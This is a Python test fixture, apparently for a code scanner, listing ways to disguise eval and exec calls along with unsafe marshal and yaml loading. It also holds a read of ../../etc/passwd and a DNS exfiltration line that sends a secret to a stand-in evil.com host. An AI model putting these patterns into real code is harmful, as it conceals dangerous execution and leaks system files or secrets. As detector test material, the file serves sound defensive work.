#!/usr/bin/env python3
"""Demonstrates various evasion techniques the scanner should catch."""

# Evasion 1: String concatenation
e = "ev" + "al"
x = "ex" + "ec"

# Evasion 2: getattr to dangerous functions
import builtins
danger = getattr(builtins, 'eval')
also_bad = getattr(__builtins__, 'exec')

# Evasion 3: chr concatenation for obfuscation
obfuscated = chr(101) + chr(118) + chr(97) + chr(108)  # "eval"

# Evasion 4: bytes.fromhex
payload = bytes.fromhex('707269...').decode()

# Evasion 5: ROT13
import codecs
sneaky = codecs.decode("riny()", "rot13")

# Evasion 6: globals/locals access
globals()['ev' + 'al']

# Evasion 7: marshal (alternative to pickle)
import marshal
marshal.loads(data)

# Evasion 8: unsafe yaml
import yaml
yaml.load(untrusted_input)  # No Loader specified

# Path traversal
with open("../../etc/passwd") as f:
    pass

# DNS exfiltration
import socket
socket.gethostbyname(secret + ".evil.com")
